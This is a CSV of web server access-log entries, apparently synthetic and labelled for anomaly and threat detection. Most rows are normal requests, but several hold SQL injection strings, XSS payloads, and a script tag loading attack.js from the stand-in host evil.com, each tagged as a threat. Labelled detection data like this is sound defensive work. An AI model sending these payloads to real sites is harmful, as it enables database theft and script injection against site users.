timestamp,ip,method,url,status,size,raw,parsed,request,potential_threats,message,level,Anomaly_Flag
09/May/2025:10:00:00 +0000,192.168.1.10,GET,/,200.0,1234.0,"192.168.1.10 - - [09/May/2025:10:00:00 +0000] ""GET / HTTP/1.1"" 200 1234",True,GET / HTTP/1.1,,GET / HTTP/1.1,INFO,0
09/May/2025:10:00:05 +0000,192.168.1.11,GET,/index.html,200.0,5678.0,"192.168.1.11 - - [09/May/2025:10:00:05 +0000] ""GET /index.html HTTP/1.1"" 200 5678",True,GET /index.html HTTP/1.1,,GET /index.html HTTP/1.1,INFO,0
09/May/2025:10:00:10 +0000,192.168.1.12,POST,/api/data,201.0,9012.0,"192.168.1.12 - - [09/May/2025:10:00:10 +0000] ""POST /api/data HTTP/1.1"" 201 9012",True,POST /api/data HTTP/1.1,,POST /api/data HTTP/1.1,INFO,0
09/May/2025:10:00:15 +0000,192.168.1.13,GET,/images/logo.png,200.0,3456.0,"192.168.1.13 - - [09/May/2025:10:00:15 +0000] ""GET /images/logo.png HTTP/1.1"" 200 3456",True,GET /images/logo.png HTTP/1.1,,GET /images/logo.png HTTP/1.1,INFO,0
09/May/2025:10:00:20 +0000,192.168.1.14,GET,/css/style.css,200.0,7890.0,"192.168.1.14 - - [09/May/2025:10:00:20 +0000] ""GET /css/style.css HTTP/1.1"" 200 7890",True,GET /css/style.css HTTP/1.1,,GET /css/style.css HTTP/1.1,INFO,0
09/May/2025:10:00:25 +0000,192.168.1.15,GET,/js/script.js,200.0,2345.0,"192.168.1.15 - - [09/May/2025:10:00:25 +0000] ""GET /js/script.js HTTP/1.1"" 200 2345",True,GET /js/script.js HTTP/1.1,,GET /js/script.js HTTP/1.1,INFO,0
09/May/2025:10:00:30 +0000,192.168.1.10,GET,/dashboard,302.0,0.0,"192.168.1.10 - - [09/May/2025:10:00:30 +0000] ""GET /dashboard HTTP/1.1"" 302 0",True,GET /dashboard HTTP/1.1,,GET /dashboard HTTP/1.1,INFO,0
09/May/2025:10:00:35 +0000,192.168.1.11,GET,/admin,401.0,345.0,"192.168.1.11 - - [09/May/2025:10:00:35 +0000] ""GET /admin HTTP/1.1"" 401 345",True,GET /admin HTTP/1.1,,GET /admin HTTP/1.1,INFO,1
09/May/2025:10:00:40 +0000,192.168.1.12,POST,/login,200.0,678.0,"192.168.1.12 - - [09/May/2025:10:00:40 +0000] ""POST /login HTTP/1.1"" 200 678",True,POST /login HTTP/1.1,,POST /login HTTP/1.1,INFO,0
09/May/2025:10:00:45 +0000,192.168.1.13,GET,/secure/info,403.0,123.0,"192.168.1.13 - - [09/May/2025:10:00:45 +0000] ""GET /secure/info HTTP/1.1"" 403 123",True,GET /secure/info HTTP/1.1,,GET /secure/info HTTP/1.1,INFO,1
09/May/2025:10:00:50 +0000,192.168.1.14,GET,/nonexistent,404.0,456.0,"192.168.1.14 - - [09/May/2025:10:00:50 +0000] ""GET /nonexistent HTTP/1.1"" 404 456",True,GET /nonexistent HTTP/1.1,,GET /nonexistent HTTP/1.1,INFO,0
09/May/2025:10:00:55 +0000,192.168.1.15,GET,/,500.0,789.0,"192.168.1.15 - - [09/May/2025:10:00:55 +0000] ""GET / HTTP/1.1"" 500 789",True,GET / HTTP/1.1,,GET / HTTP/1.1,INFO,1
09/May/2025:10:01:00 +0000,192.168.1.10,GET,/?q=SELECT,200.0,1011.0,"192.168.1.10 - - [09/May/2025:10:01:00 +0000] ""GET /?q=SELECT * FROM users; HTTP/1.1"" 200 1011",True,GET /?q=SELECT * FROM users; HTTP/1.1,['SQL_INJECTION'],GET /?q=SELECT * FROM users; HTTP/1.1,INFO,1
09/May/2025:10:01:05 +0000,192.168.1.11,GET,/?payload=<script>alert('XSS')</script>,200.0,1213.0,"192.168.1.11 - - [09/May/2025:10:01:05 +0000] ""GET /?payload=<script>alert('XSS')</script> HTTP/1.1"" 200 1213",True,GET /?payload=<script>alert('XSS')</script> HTTP/1.1,['XSS'],GET /?payload=<script>alert('XSS')</script> HTTP/1.1,INFO,1
09/May/2025:10:01:10 +0000,192.168.1.12,GET,/?q=UNION,200.0,1415.0,"192.168.1.12 - - [09/May/2025:10:01:10 +0000] ""GET /?q=UNION ALL SELECT user,password FROM users HTTP/1.1"" 200 1415",True,"GET /?q=UNION ALL SELECT user,password FROM users HTTP/1.1",['SQL_INJECTION'],"GET /?q=UNION ALL SELECT user,password FROM users HTTP/1.1",INFO,1
09/May/2025:10:01:15 +0000,192.168.1.13,GET,/?p=<script,200.0,1617.0,"192.168.1.13 - - [09/May/2025:10:01:15 +0000] ""GET /?p=<script src='http://evil.com/attack.js'></script> HTTP/1.1"" 200 1617",True,GET /?p=<script src='http://evil.com/attack.js'></script> HTTP/1.1,['XSS'],GET /?p=<script src='http://evil.com/attack.js'></script> HTTP/1.1,INFO,1
09/May/2025:10:01:20 +0000,192.168.1.14,GET,/?x=',200.0,1819.0,"192.168.1.14 - - [09/May/2025:10:01:20 +0000] ""GET /?x=' OR 1=1 -- HTTP/1.1"" 200 1819",True,GET /?x=' OR 1=1 -- HTTP/1.1,['SQL_INJECTION'],GET /?x=' OR 1=1 -- HTTP/1.1,INFO,1
09/May/2025:10:01:25 +0000,192.168.1.15,GET,/?y=<IMG,200.0,2021.0,"192.168.1.15 - - [09/May/2025:10:01:25 +0000] ""GET /?y=<IMG SRC=javascript:alert('XSS')> HTTP/1.1"" 200 2021",True,GET /?y=<IMG SRC=javascript:alert('XSS')> HTTP/1.1,['XSS'],GET /?y=<IMG SRC=javascript:alert('XSS')> HTTP/1.1,INFO,1
09/May/2025:10:01:30 +0000,192.168.1.10,GET,/normal-page,200.0,2223.0,"192.168.1.10 - - [09/May/2025:10:01:30 +0000] ""GET /normal-page HTTP/1.1"" 200 2223",True,GET /normal-page HTTP/1.1,,GET /normal-page HTTP/1.1,INFO,0
09/May/2025:10:01:35 +0000,192.168.1.11,POST,/submit,200.0,2425.0,"192.168.1.11 - - [09/May/2025:10:01:35 +0000] ""POST /submit HTTP/1.1"" 200 2425",True,POST /submit HTTP/1.1,,POST /submit HTTP/1.1,INFO,0
09/May/2025:10:01:40 +0000,192.168.1.12,GET,/another-normal,200.0,2627.0,"192.168.1.12 - - [09/May/2025:10:01:40 +0000] ""GET /another-normal HTTP/1.1"" 200 2627",True,GET /another-normal HTTP/1.1,,GET /another-normal HTTP/1.1,INFO,0
09/May/2025:10:01:45 +0000,192.168.1.13,PUT,/api/update,200.0,2829.0,"192.168.1.13 - - [09/May/2025:10:01:45 +0000] ""PUT /api/update HTTP/1.1"" 200 2829",True,PUT /api/update HTTP/1.1,,PUT /api/update HTTP/1.1,INFO,0
